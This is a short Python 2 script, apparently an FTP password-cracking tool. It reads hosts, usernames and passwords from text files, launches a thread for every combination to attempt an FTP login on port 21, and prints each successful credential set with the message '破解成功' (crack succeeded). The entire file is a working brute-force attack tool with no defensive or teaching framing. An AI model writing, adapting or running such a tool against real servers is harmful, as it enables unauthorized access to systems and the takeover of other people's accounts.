#!/usr/bin/env python
#!coding=utf-8

from ftplib import FTP
import ftplib
from threading import Thread

def Login(host,username,password):
    ftp=FTP()
    try:
        ftp.connect(host,21,1)
        ftp.login(username,password)
        ftp.retrlines('LIST')
        ftp.quit()
        print '破解成功,用户名:' + username + ',密码:' + password + ',IP:' + host
        return True
    except ftplib.all_errors:
        pass

host = open('host.txt')
for line in host:
    host=line.strip('\n')
    print '破解主机:'+ host
    user=open('user.txt')
    for line in user:
        user = line.strip('\n')
        pwd=open('pwd.txt', 'r')
        for line in pwd:
            pwd=line.strip('\n')
            t=Thread(target=Login,args=(host,user,pwd))
            t.start()